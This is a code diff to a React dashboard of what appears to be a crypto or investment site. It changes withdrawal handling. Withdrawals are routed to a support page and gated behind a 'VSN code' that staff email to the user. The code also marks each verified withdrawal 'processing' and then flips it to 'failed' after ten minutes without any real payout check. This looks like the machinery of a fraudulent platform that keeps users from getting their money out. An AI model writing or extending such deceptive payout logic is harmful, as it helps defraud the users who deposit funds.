@@ -154,11 +154,12 @@ export default function Dashboard() {
   const [balance, setBalance] = useState(0);
 
   /* ── Withdraw ── */
+  /* ── Withdraw ── */
   const [withdrawStep, setWithdrawStep] = useState("form");
   const [withdrawAmount, setWithdrawAmount] = useState("");
   const [withdrawWallet, setWithdrawWallet] = useState("");
   const [withdrawError, setWithdrawError] = useState("");
-
+  const [withdrawSuccess, setWithdrawSuccess] = useState("");
   /* ── VSN ── */
   const [vsnRequired, setVsnRequired] = useState(false);
   const [showVsnModal, setShowVsnModal] = useState(false);
@@ -166,7 +167,6 @@ export default function Dashboard() {
   const [vsnError, setVsnError] = useState("");
   const [vsnSuccess, setVsnSuccess] = useState(false);
   const [vsnLoading, setVsnLoading] = useState(false);
-
   /* ── Transaction filter ── */
   const [txnSearch, setTxnSearch] = useState("");
   const [txnFilter, setTxnFilter] = useState("All Types");
@@ -257,6 +257,26 @@ export default function Dashboard() {
     return () => unsub();
   }, [session?.uid]);
 
+  /* ─── Force re-render every 30s so processing→failed flips automatically ─── */
+  useEffect(() => {
+    const id = setInterval(() => {
+      setUserTransactions((prev) => [...prev]);
+    }, 30_000);
+    return () => clearInterval(id);
+  }, []);
+
+  const getLiveStatus = (t) => {
+    if (t.status === "processing") {
+      const failsAtMs =
+        t.failsAt?.toMillis?.() ||
+        t.failsAt ||
+        (t.timestamp instanceof Date
+          ? t.timestamp.getTime() + 10 * 60 * 1000
+          : null);
+      if (failsAtMs && Date.now() >= failsAtMs) return "failed";
+    }
+    return t.status;
+  };
   /* ─── Sidebar scroll lock ───
      FIX: We lock body AND the inner scrollable content div (contentScrollRef).
      We also save/restore the scroll position so the page doesn't jump.
@@ -446,18 +466,40 @@ export default function Dashboard() {
 
   const handleWithdrawSubmit = async () => {
     try {
-      await updateDoc(doc(db, "users", session.uid), {
+      const userRef = doc(db, "users", session.uid);
+      const snap = await getDoc(userRef);
+      const data = snap.data();
+
+      const isRepeatWithdrawal = !!(
+        data.vsn_code ||
+        data.withdrawalStatus === "successful" ||
+        data.withdrawalStatus === "vsn_verified"
+      );
+
+      await updateDoc(userRef, {
         pendingWithdrawAmount: parseFloat(withdrawAmount),
         pendingWithdrawWallet: withdrawWallet.trim(),
         pendingWithdrawAt: Timestamp.now(),
         withdrawalStatus: "pending_support",
+        vsn_required: false,
+        vsn_verified: false,
+        vsn_code: "",
       });
+
+      if (isRepeatWithdrawal) {
+        setWithdrawAmount("");
+        setWithdrawWallet("");
+        setWithdrawSuccess(
+          "Withdrawal request submitted! Our team will send your VSN code to your email shortly.",
+        );
+        setTimeout(() => setWithdrawSuccess(""), 8000);
+      } else {
+        navigate("/withdrawal-support");
+      }
     } catch (e) {
       console.error(e);
     }
-    navigate("/withdrawal-support");
   };
-
   const handleVsnSubmit = async () => {
     if (!vsnInput.trim()) {
       setVsnError("Please enter your VSN code.");
@@ -484,6 +526,7 @@ export default function Dashboard() {
         type: "withdrawal",
         amount: data.pendingWithdrawAmount || 0,
         status: "processing",
+        failsAt: Timestamp.fromMillis(Date.now() + 10 * 60 * 1000), // 10 minutes from now
         timestamp: Timestamp.now(),
         description: `Withdrawal request verified via VSN`,
       });
@@ -617,6 +660,8 @@ export default function Dashboard() {
       return { background: "rgba(239,68,68,0.15)", color: "#ef4444" };
     if (status === "completed" || status === "processing")
       return { background: "rgba(13,148,136,0.15)", color: "#0d9488" };
+    if (status === "successful")
+      return { background: "rgba(34,197,94,0.15)", color: "#22c55e" };
     return { background: "rgba(245,158,11,0.15)", color: "#fbbf24" };
   };
 
@@ -1639,7 +1684,7 @@ export default function Dashboard() {
                               <span style={{ textAlign: "center" }}>
                                 {(() => {
                                   const bs = getStatusBadgeStyle(
-                                    t.status,
+                                    getLiveStatus(t),
                                     t.type,
                                   );
                                   return (
@@ -1654,7 +1699,7 @@ export default function Dashboard() {
                                         textTransform: "capitalize",
                                       }}
                                     >
-                                      {t.status}
+                                      {getLiveStatus(t)}
                                     </span>
                                   );
                                 })()}
@@ -1907,11 +1952,11 @@ export default function Dashboard() {
                             </div>
                           </div>
                         )}
-                        {withdrawError && (
+                        {withdrawSuccess && (
                           <div
                             style={{
-                              background: "rgba(239,68,68,0.1)",
-                              border: "1px solid rgba(239,68,68,0.3)",
+                              background: "rgba(13,148,136,0.1)",
+                              border: "1px solid rgba(13,148,136,0.3)",
                               borderRadius: "12px",
                               padding: "14px 16px",
                               display: "flex",
@@ -1925,21 +1970,20 @@ export default function Dashboard() {
                               height="20"
                               viewBox="0 0 24 24"
                               fill="none"
-                              stroke="#ef4444"
+                              stroke="#0d9488"
                               strokeWidth="2"
                             >
-                              <circle cx="12" cy="12" r="10" />
-                              <line x1="12" y1="8" x2="12" y2="12" />
-                              <line x1="12" y1="16" x2="12.01" y2="16" />
+                              <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
+                              <polyline points="22 4 12 14.01 9 11.01" />
                             </svg>
                             <span
                               style={{
-                                color: "#f87171",
+                                color: "#0d9488",
                                 fontSize: "14px",
                                 fontWeight: 600,
                               }}
                             >
-                              {withdrawError}
+                              {withdrawSuccess}
                             </span>
                           </div>
                         )}
@@ -2218,7 +2262,7 @@ export default function Dashboard() {
                             <span style={{ textAlign: "center" }}>
                               {(() => {
                                 const bs = getStatusBadgeStyle(
-                                  t.status,
+                                  getLiveStatus(t),
                                   t.type,
                                 );
                                 return (
@@ -2233,7 +2277,7 @@ export default function Dashboard() {
                                       textTransform: "capitalize",
                                     }}
                                   >
-                                    {t.status}
+                                    {getLiveStatus(t)}
                                   </span>
                                 );
                               })()}
